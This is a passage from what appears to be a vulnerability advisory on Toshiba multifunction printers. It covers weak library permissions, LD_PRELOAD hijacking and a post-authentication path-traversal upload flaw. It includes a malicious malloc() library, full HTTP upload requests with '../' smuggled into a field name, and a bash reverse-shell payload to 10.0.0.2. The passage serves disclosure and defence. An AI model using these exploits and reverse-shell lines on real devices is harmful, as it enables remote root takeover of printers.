4be9f000-4bea0000 rw-p 00021000 08:02 142900     /usr/lib/libk5crypto.so.3.1
4bea7000-4bead000 r-xp 00000000 08:02 140031     /usr/lib/libkrb5support.so.0.1
4bead000-4beae000 rw-p 00005000 08:02 140031     /usr/lib/libkrb5support.so.0.1
4c04f000-4c133000 r-xp 00000000 08:02 145085     /usr/lib/libstdc++.so.6.0.13
4c133000-4c137000 r--p 000e4000 08:02 145085     /usr/lib/libstdc++.so.6.0.13
4c137000-4c138000 rw-p 000e8000 08:02 145085     /usr/lib/libstdc++.so.6.0.13
...
710a3000-710a5000 r-xp 00000000 08:02 153564     /home/SYSROM_SRC/build/thirdparty/lib/mod_authn_file.so
710a5000-710a6000 rw-p 00001000 08:02 153564     /home/SYSROM_SRC/build/thirdparty/lib/mod_authn_file.so
710a6000-710a9000 r-xp 00000000 08:02 154158     /home/SYSROM_SRC/build/thirdparty/lib/mod_authn_core.so
710a9000-710aa000 rw-p 00002000 08:02 154158     /home/SYSROM_SRC/build/thirdparty/lib/mod_authn_core.so
710aa000-710b4000 r-xp 00000000 08:02 154478     /home/SYSROM_SRC/build/thirdparty/lib/mod_dav_fs.so
710b4000-710b5000 rw-p 00009000 08:02 154478     /home/SYSROM_SRC/build/thirdparty/lib/mod_dav_fs.so
...
75674000-75677000 r--p 00064000 08:02 153751     /home/SYSROM_SRC/build/thirdparty/lib/libssl.so.1.0.0
75677000-7567b000 rw-p 00067000 08:02 153751     /home/SYSROM_SRC/build/thirdparty/lib/libssl.so.1.0.0
7567b000-756b0000 r-xp 00000000 08:02 154613     /home/SYSROM_SRC/build/thirdparty/lib/libldap-2.4.so.2.5.6
756b0000-756b3000 rw-p 00034000 08:02 154613     /home/SYSROM_SRC/build/thirdparty/lib/libldap-2.4.so.2.5.6
756b3000-756bd000 r-xp 00000000 08:02 11632      /lib/libpam.so.0.82.2
756bd000-756be000 rw-p 0000a000 08:02 11632      /lib/libpam.so.0.82.2
756be000-76217000 r-xp 00000000 08:02 21362      /home/SYSROM_SRC/build/release/lib/libssdk.so.0.0.0
76217000-76258000 rw-p 00b58000 08:02 21362      /home/SYSROM_SRC/build/release/lib/libssdk.so.0.0.0
76258000-7625f000 rw-p 00000000 00:00 0
7625f000-7626a000 r-xp 00000000 08:02 20801      /home/SYSROM_SRC/build/release/lib/libcimsg.so.0
7626a000-7626b000 rw-p 0000a000 08:02 20801      /home/SYSROM_SRC/build/release/lib/libcimsg.so.0
7626b000-76273000 r-xp 00000000 08:02 20878      /home/SYSROM_SRC/build/release/lib/mod_efiwebserver.so.0
76273000-76274000 rw-p 00007000 08:02 20878      /home/SYSROM_SRC/build/release/lib/mod_efiwebserver.so.0
76274000-76275000 ---p 00000000 00:00 0
76275000-76a74000 rwxp 00000000 00:00 0
76a74000-76a77000 rw-p 00000000 00:00 0
76a77000-76a7b000 r-xp 00000000 08:02 11633      /lib/libattr.so.1.1.0
76a7b000-76a7c000 rw-p 00003000 08:02 11633      /lib/libattr.so.1.1.0
76a7c000-76a82000 r-xp 00000000 08:02 11721      /lib/libacl.so.1.1.0
76a82000-76a83000 rw-p 00005000 08:02 11721      /lib/libacl.so.1.1.0
76a83000-76a84000 rw-p 00000000 00:00 0
76a84000-76af3000 r-xp 00000000 08:02 21782      /home/SYSROM_SRC/build/release/lib/libcios.so.0
76af3000-76af7000 rw-p 0006f000 08:02 21782      /home/SYSROM_SRC/build/release/lib/libcios.so.0
76af7000-76b50000 r-xp 00000000 08:02 145519     /usr/lib/libintlc.so.5
76b50000-76b53000 rw-p 00059000 08:02 145519     /usr/lib/libintlc.so.5
76b53000-76b5c000 r-xp 00000000 08:02 11622      /lib/libcrypt-2.11.3.so
76b5c000-76b5d000 r--p 00008000 08:02 11622      /lib/libcrypt-2.11.3.so
76b5d000-76b5e000 rw-p 00009000 08:02 11622      /lib/libcrypt-2.11.3.so
76b5e000-76b85000 rw-p 00000000 00:00 0
76b85000-76b97000 r-xp 00000000 08:02 154448     /home/SYSROM_SRC/build/thirdparty/lib/libroken.so.18.1.0
76b97000-76b98000 rw-p 00012000 08:02 154448     /home/SYSROM_SRC/build/thirdparty/lib/libroken.so.18.1.0
76b98000-76b99000 rw-p 00000000 00:00 0
76b99000-76b9c000 r-xp 00000000 08:02 154186     /home/SYSROM_SRC/build/thirdparty/lib/libcom_err.so.1.1.3
76b9c000-76b9d000 rw-p 00002000 08:02 154186     /home/SYSROM_SRC/build/thirdparty/lib/libcom_err.so.1.1.3
76b9d000-76bc4000 r-xp 00000000 08:02 154600     /home/SYSROM_SRC/build/thirdparty/lib/libwind.so.0.0.0
76bc4000-76bc5000 rw-p 00027000 08:02 154600     /home/SYSROM_SRC/build/thirdparty/lib/libwind.so.0.0.0
76bc5000-76c64000 r-xp 00000000 08:02 154326     /home/SYSROM_SRC/build/thirdparty/lib/libasn1.so.8.0.0
76c64000-76c67000 rw-p 0009f000 08:02 154326     /home/SYSROM_SRC/build/thirdparty/lib/libasn1.so.8.0.0
76c67000-76c96000 r-xp 00000000 08:02 153499     /home/SYSROM_SRC/build/thirdparty/lib/libhcrypto.so.4.1.0
76c96000-76c99000 rw-p 0002e000 08:02 153499     /home/SYSROM_SRC/build/thirdparty/lib/libhcrypto.so.4.1.0
76c99000-76c9a000 rw-p 00000000 00:00 0
76c9a000-76d0b000 r-xp 00000000 08:02 153648     /home/SYSROM_SRC/build/thirdparty/lib/libheimsqlite.so.0.0.0
76d0b000-76d0d000 rw-p 00070000 08:02 153648     /home/SYSROM_SRC/build/thirdparty/lib/libheimsqlite.so.0.0.0
76d0d000-76d0e000 rw-p 00000000 00:00 0
76d0e000-76d4d000 r-xp 00000000 08:02 154400     /home/SYSROM_SRC/build/thirdparty/lib/libhx509.so.5.0.0
76d4d000-76d4f000 rw-p 0003f000 08:02 154400     /home/SYSROM_SRC/build/thirdparty/lib/libhx509.so.5.0.0
76d4f000-76d55000 r-xp 00000000 08:02 145615     /usr/lib/libirng.so
76d55000-76d58000 rw-p 00005000 08:02 145615     /usr/lib/libirng.so
76d58000-76d6b000 r-xp 00000000 08:02 21737      /home/SYSROM_SRC/build/release/lib/libllmnrclient.so.0
76d6b000-76d6c000 rw-p 00012000 08:02 21737      /home/SYSROM_SRC/build/release/lib/libllmnrclient.so.0
76d6c000-77568000 r-xp 00000000 08:02 157246     /mfp/lib/libsvml.so
77568000-77586000 rw-p 007fc000 08:02 157246     /mfp/lib/libsvml.so
77586000-77587000 rw-p 00000000 00:00 0
77587000-775ad000 r-xp 00000000 08:02 11746      /lib/libm-2.11.3.so
775ad000-775ae000 r--p 00025000 08:02 11746      /lib/libm-2.11.3.so
775ae000-775af000 rw-p 00026000 08:02 11746      /lib/libm-2.11.3.so
775af000-77624000 r-xp 00000000 08:02 145632     /usr/lib/libsqlite3.so.0.8.6
77624000-77626000 rw-p 00074000 08:02 145632     /usr/lib/libsqlite3.so.0.8.6
77626000-77627000 rw-p 00000000 00:00 0
77627000-77695000 r-xp 00000000 08:02 154620     /home/SYSROM_SRC/build/thirdparty/lib/libkrb5.so.25.0.0
77695000-77698000 rw-p 0006e000 08:02 154620     /home/SYSROM_SRC/build/thirdparty/lib/libkrb5.so.25.0.0
77698000-776ad000 r-xp 00000000 08:02 11629      /lib/libpthread-2.11.3.so
776ad000-776ae000 r--p 00014000 08:02 11629      /lib/libpthread-2.11.3.so
776ae000-776af000 rw-p 00015000 08:02 11629      /lib/libpthread-2.11.3.so
776af000-776b2000 rw-p 00000000 00:00 0
776b2000-776db000 r-xp 00000000 08:02 153455     /home/SYSROM_SRC/build/thirdparty/lib/libapr-1.so.0.7.0
776db000-776dd000 rw-p 00028000 08:02 153455     /home/SYSROM_SRC/build/thirdparty/lib/libapr-1.so.0.7.0
776dd000-776fb000 r-xp 00000000 08:02 154622     /home/SYSROM_SRC/build/thirdparty/lib/libaprutil-1.so.0.6.1
776fb000-776fd000 rw-p 0001e000 08:02 154622     /home/SYSROM_SRC/build/thirdparty/lib/libaprutil-1.so.0.6.1
776fd000-776fe000 rw-p 00000000 00:00 0
776fe000-77702000 r-xp 00000000 08:02 154313     /home/SYSROM_SRC/build/thirdparty/lib/mod_headers.so
77702000-77703000 rw-p 00003000 08:02 154313     /home/SYSROM_SRC/build/thirdparty/lib/mod_headers.so
77703000-77712000 r-xp 00000000 00:0d 10594      /ramdisk/al/libGetAddtInfoInterface.so
77712000-77714000 rw-p 0000e000 00:0d 10594      /ramdisk/al/libGetAddtInfoInterface.so
77714000-77715000 rw-p 00000000 00:00 0
77715000-77720000 r-xp 00000000 00:0d 11406      /ramdisk/al/libGetNameInfoInterface.so
77720000-77722000 rw-p 0000a000 00:0d 11406      /ramdisk/al/libGetNameInfoInterface.so
</code></pre>
<p>Because of weak permissions, we can overwrite hundreds of libraries to get Remote Code Execution.</p>
<p>We can overwrite the 2 libraries that will be loaded by default by the programs running inside the printers:</p>
<ul>
<li><code>/ramdisk/al/libGetAddtInfoInterface.so</code></li>
<li><code>/ramdisk/al/libGetNameInfoInterface.so</code></li>
</ul>
<p>These 2 libraries export Intel-optimized functions.</p>
<p>Exported functions found in the LD_PRELOAD'ed libraries:</p>
<pre><code>kali% nm -D /home/user/research/printers/topaccess/4.50-latest-version/4.50-new-version/extract/home/SYSROM_SRC/build/release/lib/libGetNameInfoInterface.so.0
0000cf40 A __bss_start
00009150 T __cacheSize
         w __cxa_finalize@GLIBC_2.1.3
         U dlsym@GLIBC_2.0
0000cf40 A _edata
0000cfc0 A _end
00009d04 T _fini
00002340 T getnameinfo
00002290 T getNameInfoWrapper
         w __gmon_start__
00002088 T _init
00009cb0 T __intel_f2int
00002530 T _intel_fast_memcpy
00002440 T _intel_fast_memcpy.A
00002500 T _intel_fast_memcpy.H
00002470 T _intel_fast_memcpy.J
000024a0 T _intel_fast_memcpy.M
000024d0 T _intel_fast_memcpy.P
000026f0 T _intel_fast_memset
00002600 T _intel_fast_memset.A
00002660 T _intel_fast_memset.H
00002630 T _intel_fast_memset.J
00002690 T _intel_fast_memset.M
000026c0 T _intel_fast_memset.P
000027cc T __intel_memcpy
000033fd T __intel_memset
000027c0 T __intel_new_memcpy
00003b10 T __intel_new_memcpy_P3
000033f0 T __intel_new_memset
00004a90 T __intel_new_memset_P3
000051e0 T __intel_sse2_memset
00005850 T __intel_sse2_rep_memset
00005dd0 T __intel_ssse3_memcpy
00007dc0 T __intel_ssse3_rep_memcpy
         w _Jv_RegisterClasses
         U memcpy@GLIBC_2.0
         U memset@GLIBC_2.0
         U pthread_create@GLIBC_2.1
         U pthread_join@GLIBC_2.0
kali% nm -D /home/user/research/printers/topaccess/4.50-latest-version/4.50-new-version/extract/home/SYSROM_SRC/build/release/lib/libGetNameInfoInterface.so.0
0000cf40 A __bss_start
00009150 T __cacheSize
         w __cxa_finalize@GLIBC_2.1.3
         U dlsym@GLIBC_2.0
0000cf40 A _edata
0000cfc0 A _end
00009d04 T _fini
00002340 T getnameinfo
00002290 T getNameInfoWrapper
         w __gmon_start__
00002088 T _init
00009cb0 T __intel_f2int
00002530 T _intel_fast_memcpy
00002440 T _intel_fast_memcpy.A
00002500 T _intel_fast_memcpy.H
00002470 T _intel_fast_memcpy.J
000024a0 T _intel_fast_memcpy.M
000024d0 T _intel_fast_memcpy.P
000026f0 T _intel_fast_memset
00002600 T _intel_fast_memset.A
00002660 T _intel_fast_memset.H
00002630 T _intel_fast_memset.J
00002690 T _intel_fast_memset.M
000026c0 T _intel_fast_memset.P
000027cc T __intel_memcpy
000033fd T __intel_memset
000027c0 T __intel_new_memcpy
00003b10 T __intel_new_memcpy_P3
000033f0 T __intel_new_memset
00004a90 T __intel_new_memset_P3
000051e0 T __intel_sse2_memset
00005850 T __intel_sse2_rep_memset
00005dd0 T __intel_ssse3_memcpy
00007dc0 T __intel_ssse3_rep_memcpy
         w _Jv_RegisterClasses
         U memcpy@GLIBC_2.0
         U memset@GLIBC_2.0
         U pthread_create@GLIBC_2.1
         U pthread_join@GLIBC_2.0
kali%
</code></pre>
<p>An attacker can create a new library and export a function that will be used by any program, for example <code>malloc()</code>.</p>
<p>A custom library has been written, hijacking the control flow of the <code>malloc()</code> function:</p>
<pre><code>kali% cat Makefile 
all:
        rm /home/user/research/printers/topaccess/malloc/malloc.so
        gcc -o malloc.so -m32 -shared -fPIC malloc.c

kali% cat malloc.c 
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;dlfcn.h&gt;

void *malloc(size_t size)
{
  static void *(*fptr)(size_t) = NULL;

  if (fptr == NULL)
  {
    fptr = (void *(*)(size_t))dlsym(RTLD_NEXT, "malloc");
    if (fptr == NULL)
    {
      printf("dlsym: %s\n", dlerror());
      return NULL;
    }
  }

  system("LD_PRELOAD='' id &gt; /dev/shm/id");

  return (*fptr)(size);
}
kali% make
rm /home/user/research/printers/topaccess/malloc/malloc.so
gcc -o malloc.so -m32 -shared -fPIC malloc.c
kali% ls -la
total 32
drwx------ 2 user user  4096 May 13 11:04 .
drwx------ 4 user user  4096 May 13 11:02 ..
-rw------- 1 user user   112 May 13 11:04 Makefile
-rw------- 1 user user   398 May 13 11:03 malloc.c
-rwx------ 1 user user 14696 May 13 11:04 malloc.so
kali%
</code></pre>
<p>When uploading this library as <code>/ramdisk/al/libGetAddtInfoInterface.so</code> or <code>/ramdisk/al/libGetNameInfoInterface.so</code>, the <code>malloc()</code> function will be executed by some programs running inside the printers and the id command will be executed as root (the output will be written into <code>/dev/shm/id</code>).</p>
<p>A side effect it that a lot of programs will also crash. The execution of the malicious payload will still work.</p>
<p>By targeting only specific functions used by Apache or specific programs inside the printer, it is possible to avoid crashing the programs.</p>
<p><a id="pre-auth-rce-misc"></a></p>
<h3>Other ways to get Remote Code Execution</h3>
<p>An attacker can use the other vulnerabilities to get Remote Code Execution:</p>
<ul>
<li><a href="#lpe-rce-path">Local Privilege Escalation and Remote Code Execution using insecure PATH</a></li>
<li><a href="#lpe-rce-ld-preload">Local Privilege Escalation and Remote Code Execution using insecure LD_PRELOAD</a></li>
<li><a href="#lpe-rce-ld-library-path">Local Privilege Escalation and Remote Code Execution using insecure LD_LIBRARY_PATH</a></li>
<li><a href="#lpe-rce-106-programs">Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a></li>
<li><a href="#lpe-rce-cissm">Local Privilege Escalation and Remote Code Execution using CISSM</a></li>
</ul>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p>An attacker can overwrite any insecure files (including programs running as root and Python code).</p>
<p><a id="post-auth-rces-upload"></a></p>
<h2>Details - Multiple Post-authenticated Remote Code Executions as root</h2>
<p>Toshiba printers provide several ways to upload files using the admin web interface.</p>
<p>The vulnerability in this chapter is similar to <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> but requires authentication on the TopAccess interface.</p>
<p>When an administrator is authenticated, it is possible to upload documents within the web interface using the maintenance interface:</p>
<ul>
<li>Upload of drivers files;</li>
<li>Upload of MAC PPD Files;</li>
<li>Upload of Unix Filters;</li>
<li>Upload of Driver packages;</li>
<li>Upload of address book, mailboxes and templates;</li>
<li>Upload of SSL certificates;</li>
<li>...</li>
</ul>
<p>Several webpages with an upload forms can be found in the admin interface:</p>
<ul>
<li>http://printer-ip/Administration/maintenance/uploadsoft/UnixList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/UploadList.html</li>
<li>http://printer-ip/Administration/maintenance/xmlformat/XmlFormatList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/MacList.html</li>
<li>http://printer-ip/Administration/maintenance/import/ImportListFrame.html</li>
<li>http://printer-ip/Administration/Languages/InstallLanguagesUpload.html</li>
<li>http://printer-ip/Administration/AdminRegistration/ImageIconManagementFrame.html</li>
<li>http://printer-ip/Administration/Cloning/CloneFileUpload.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/DriverCustomize.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/MacList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/PointAndPrintList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/UnixList.html</li>
<li>http://printer-ip/Administration/maintenance/uploadsoft/UploadList.html</li>
<li>http://printer-ip/Administration/maintenance/xmlformat/XmlFormatList.html</li>
<li>http://printer-ip/Administration/maintenance/import/ImportListFrame.html</li>
<li>http://printer-ip/Administration/maintenance/backup/BackupList.html</li>
<li>http://printer-ip/Administration/Security/Certificates/CertUpload.html</li>
<li>http://printer-ip/Administration/MetaScan/XMLFormatFile/XmlFormatList.html</li>
<li>http://printer-ip/Administration/Setup/setting/DDNSUpload.html</li>
<li>http://printer-ip/Administration/Setup/ServerConnErrRegFileUpload.html</li>
<li>http://printer-ip/Administration/Setup/PDLUpload.html</li>
<li>http://printer-ip/Administration/Setup/ICCProfile/ImportICCProfile.html</li>
<li>http://printer-ip/Administration/SystemUpdates/nSystemUpdatesUpload.html</li>
</ul>
<p>All these upload functionalities are vulnerable: they allow an attacker with admin privilege to overwrite any file present in the printers.</p>
<p>The vulnerability likely resides in the <code>/home/SYSROM_SRC/build/release/lib/mod_contentwebserver.so.0</code> library, where the <code>/contentwebserver/upload</code> API is implemented. Consequently, this is a unique vulnerability that is reachable by using different upload forms.</p>
<p>For example, we can see 3 different types of upload forms:</p>
<p>Upload of Driver files</p>
<p><img alt="" src="images/2024-toshiba-post-auth-upload-file-01.png" /></p>
<p><a href="images/2024-toshiba-post-auth-upload-file-01-full.png">Click here for full image</a></p>
<p>Upload of Unix filters</p>
<p><img alt="" src="images/2024-toshiba-post-auth-upload-file-02.png" /></p>
<p><a href="images/2024-toshiba-post-auth-upload-file-02-full.png">Click here for full image</a></p>
<p>Upload of address book, mailboxes and templates</p>
<p><img alt="" src="images/2024-toshiba-post-auth-upload-file-03.png" /></p>
<p><a href="images/2024-toshiba-post-auth-upload-file-03-full.png">Click here for full image</a></p>
<p>All of these forms are vulnerable by crafting a malicious <code>name</code> value as shown in the next screenshot. It is possible to change the HTTP request by modifying the name value to rewrite any file in the printer.</p>
<p>For example, it is possible to overwrite the <code>/home/SYSROM_SRC/build/common/bin/networkservice/ldapserver</code> shell script by sending a malicious file using the name value <code>/./../../../../../home/SYSROM_SRC/build/common/bin/networkservice/ldapserver</code>:</p>
<p>Upload of malicious ldapserver shell script:</p>
<p><img alt="" src="images/2024-toshiba-post-auth-upload-file-04.png" /></p>
<p>It is necessary to update the cookie and the CsrfpId values:</p>
<pre><code>POST /contentwebserver/upload HTTP/1.1
Host: 10.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------136357212815291094282690264320
Content-Length: 1056
Origin: http://10.0.0.1:8081
Connection: close
Referer: http://10.0.0.1:8081/Administration/maintenance/uploadsoft/DriverCustomize.html?v=1670278837ta&amp;fileMode=3
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DMAINT%26CAT%3DUPSW; IgnoreSessionTimeout=1; Session=10.0.0.2.3dfcc68624ce6c49d245e33f704a92b3; clicked=0; addrLastVisited=FAVGRP
Upgrade-Insecure-Requests: 1

-----------------------------136357212815291094282690264320
Content-Disposition: form-data; name="formSubmitCompleteEventHandler"

frames[0].formSubmitCompleteUploadList
-----------------------------136357212815291094282690264320
Content-Disposition: form-data; name="DeviceInformationModel"

&lt;DeviceInformationModel&gt;&lt;Command&gt;&lt;Move&gt;&lt;commandNode&gt;FileStorages&lt;/commandNode&gt;&lt;Params&gt;&lt;source&gt;&lt;File&gt;script.zip&lt;/File&gt;&lt;name&gt;Upload&lt;/name&gt;&lt;/source&gt;&lt;destination&gt;&lt;name&gt;PDPlugin&lt;/name&gt;&lt;/destination&gt;&lt;/Params&gt;&lt;/Move&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
-----------------------------136357212815291094282690264320
Content-Disposition: form-data; name="CsrfpId"

10.0.0.2.3dfcc68624ce6c49d245e33f704a92b3
-----------------------------136357212815291094282690264320
Content-Disposition: form-data; name="/./../../../../../home/SYSROM_SRC/build/common/bin/networkservice/ldapserver"; filename="script.zip"
Content-Type: application/zip

#!/bin/sh

bash -i &gt;&amp; /dev/tcp/10.0.0.2/21 0&gt;&amp;1

-----------------------------136357212815291094282690264320--
</code></pre>
<p>Following this HTTP request, the file <code>/home/SYSROM_SRC/build/common/bin/networkservice/ldapserver</code> will be overwritten with a malicious payload.</p>
<p>Before the execution of the HTTP request, the file is normal:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
-rwxrwxrwx 1 root root 7007 Mar 15 11:45 /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
bash-4.1# head /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
#!/bin/bash
LDAP_STARTUP_STATUS=0;

function stop() {
        echo "slapd is stopped"
        kill -SIGINT `pgrep slapd`
        check_stop_process
}

function start() {
bash-4.1#
</code></pre>
<p>After the execution of the HTTP request, the file has been modified. It now contains the malicious payload:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
-rw-rw-rw- 1 apache trusted 52 May 27 16:35 /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
bash-4.1# cat /home/SYSROM_SRC/build/common/bin/networkservice/ldapserver
#!/bin/sh

bash -i &gt;&amp; /dev/tcp/10.0.0.2/21 0&gt;&amp;1
bash-4.1#
</code></pre>
<p>Another exploitation of a different form is shown below, using the upload of drivers. It exploits the same vulnerability. The file <code>/home/SYSROM_SRC/sbin/malicious.program</code> will contain <code>test</code>:</p>
<p>Upload of <code>/home/SYSROM_SRC/sbin/malicious.program</code>:</p>
<pre><code>POST /contentwebserver/upload HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------8960912535828260861374302822
Content-Length: 1813
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/Administration/maintenance/uploadsoft/UnixList.html?v=1517352288ta&amp;fileMode=2
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DMAINT%26CAT%3DUPSW; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; SessionID=Session_3e61919e-556b-4be7-8a18-91bb65a4752b; clicked=0; addrLastVisited=ADDRBK; IgnoreSessionTimeout=1; Session=10.0.0.2.cab8f72fb0d8c69e622235cfff9d3cee
Upgrade-Insecure-Requests: 1

-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="formSubmitCompleteEventHandler"

frames[0].formSubmitCompleteUploadList
-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="DeviceInformationModel"

&lt;DeviceInformationModel&gt;&lt;Command&gt;&lt;Move&gt;&lt;commandNode&gt;FileStorages&lt;/commandNode&gt;&lt;Params&gt;&lt;source&gt;&lt;File&gt;aix.tar&lt;/File&gt;&lt;name&gt;Upload&lt;/name&gt;&lt;/source&gt;&lt;destination&gt;&lt;name&gt;Unix-Filters&lt;/name&gt;&lt;/destination&gt;&lt;/Params&gt;&lt;/Move&gt;&lt;/Command&gt;&lt;/DeviceInformationModel&gt;
-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="CsrfpId"

10.0.0.2.cab8f72fb0d8c69e622235cfff9d3cee
-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="/./../../../../../home/SYSROM_SRC/sbin/malicious.program"; filename="aix.tar"
Content-Type: application/x-tar

test

-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="hpux.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="hpux64.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="linux.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="openunix.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822
Content-Disposition: form-data; name="solaris.tar"; filename=""
Content-Type: application/octet-stream


-----------------------------8960912535828260861374302822--
</code></pre>
<p>And we can confirm this file has been uploaded on the printer:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/sbin/malicious.program
-rw-rw-rw- 1 apache trusted 5 May 27 07:48 /home/SYSROM_SRC/sbin/malicious.program
bash-4.1#
</code></pre>
<p>This vulnerability can be used to get Remote Code Executions using several different ways. Due to some weaknesses found in Toshiba printers, there are hundreds different ways to get Remote Code Execution. For example:</p>
<ul>
<li>Upload of a malicious library defined in the LD_PRELOAD variable:<ul>
<li>/ramdisk/al/libGetNameInfoInterface.so or /ramdisk/al/libGetAddtInfoInterface.so can be overwritten by a malicious library</li>
</ul>
</li>
<li>Upload of a malicious library using the LD_LIBRARY_PATH variable - An attacker can upload malicious libraries inside:<ul>
<li>/home/SYSROM_SRC/build/release/lib,</li>
<li>/mfp/lib,</li>
<li>/home/SYSROM_SRC/NoBuildItems/common/lib,</li>
<li>/home/SYSROM_SRC/build/thirdparty/plugins/platforminputcontexts/,</li>
<li>/home/SYSROM_SRC/build/release/lib.</li>
</ul>
</li>
<li>Upload of a malicious program due to insecure permissions:<ul>
<li>As shown in <a href="#lpe-rce-106-programs">Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a>, a lot of programs running as root can be overwritten due to insecure permissions (777)</li>
</ul>
</li>
<li>Upload a malicious Python program or a malicious Python library</li>
<li>Replace Bash scripts</li>
<li>...</li>
</ul>
<p>An attacker with admin privileges can remotely compromise any Toshiba printer.</p>
<p>An attacker with admin privileges can overwrite any insecure file (including programs running as root and Python code).</p>
<p><a id="lack-privilages-separation"></a></p>
<h2>Details - Lack of privileges separation</h2>
<p>Toshiba printers do not implement privileges separation. An attacker compromising a program will be able to compromise the entire printer.</p>
<p>For example, all the programs, except Apache, are running as root.</p>
<p>Apache is not running as root but a Local Privilege Escalation can be achieved using one of these vulnerabilities:</p>
<ul>
<li><a href="#lpe-rce-snmpd">Local Privilege Escalation and Remote Code Execution using snmpd</a></li>
<li><a href="#lpe-rce-path">Local Privilege Escalation and Remote Code Execution using insecure PATH</a></li>
<li><a href="#lpe-rce-ld-preload">Local Privilege Escalation and Remote Code Execution using insecure LD_PRELOAD</a></li>
<li><a href="#lpe-rce-ld-library-path">Local Privilege Escalation and Remote Code Execution using insecure LD_LIBRARY_PATH</a></li>
<li><a href="#lpe-rce-106-programs">Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a></li>
</ul>
<p>Listing of processes on the printer:</p>
<pre><code>bash-4.1# ps auxw
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   1740   512 ?        Ss   16:34   0:00 init [3]  
root         2  0.0  0.0      0     0 ?        S    16:34   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    16:34   0:00 [ksoftirqd/0]
[...]
root      1448  0.0  0.7 143680 21860 ?        Sl   16:34   0:00 /home/SYSROM_SRC/build/release/bin/slapd -h ldap://127.0.0.1 -f /home/SYSROM_SRC/build/release/etc/openldap/slapd.conf -d 1
root      1460  0.0  0.2 387308  8036 ?        Sl   16:34   0:02 /home/SYSROM_SRC/bin/mapper firstboot=0
root      1482  0.0  0.0  26120  2628 ?        Ss   16:34   0:00 /usr/local/ebx/httpd_worker/bin/httpd_worker -f /encryption/al/network/config/httpd-prox.conf -k start
apache    1486  0.0  0.1 1264444 3728 ?        Sl   16:34   0:00 /usr/local/ebx/httpd_worker/bin/httpd_worker -f /encryption/al/network/config/httpd-prox.conf -k start
[...]
root      1757  0.0  0.2  34388  8176 ?        S    16:34   0:00 ./cipollproc
root      1758  0.0  0.2  34432  8180 ?        S&lt;   16:34   0:00 ./ciprioritymanager
root      1785  0.3  1.9 815004 59476 ?        Sl   16:34   0:51 ./ebx_dl 1539 1537 1540 1 2 3 -T8
root      1786  0.0  0.5 101584 15612 ?        S    16:34   0:00 ./de_ipfax 1539 1537 1540 1 2 3 -T8
root      1803  0.0  0.3  38908  9448 ?        S    16:34   0:00 ./alnfcplugin
root      1846  0.0  0.0  15544  2788 ?        S    16:34   0:00 /home/SYSROM_SRC/bin/eBXDebugLogUtility
root      1850  0.0  0.0   1744   500 ttyS0    Ss+  16:34   0:00 /sbin/getty 115200 ttyS0
root      1864  0.0  0.4  46528 13060 ?        S    16:34   0:00 ./alfilestoragem -T8
root      1866  0.0  0.6  60164 18036 ?        S    16:34   0:00 ./alusermgr
root      1867  0.0  0.4  44120 14156 ?        S    16:34   0:00 ./allicensemgmt
root      1868  0.0  0.6  56792 18680 ?        Sl   16:34   0:00 ./aldeviceserviceplugin
root      1869  0.0  1.4  84708 42192 ?        S    16:34   0:03 ./aldeviceconfigplugin
root      1870  0.0  0.6  60856 20516 ?        S    16:34   0:01 ./aluserAuthMgr
root      1871  0.0  0.3  41912 11224 ?        S    16:34   0:00 ./algrpmgr
root      1872  0.0  0.4  43616 13080 ?        S    16:34   0:00 ./alrolemgr
root      1873  0.0  0.5  54708 14972 ?        Sl   16:34   0:05 ./alrestrictionmode
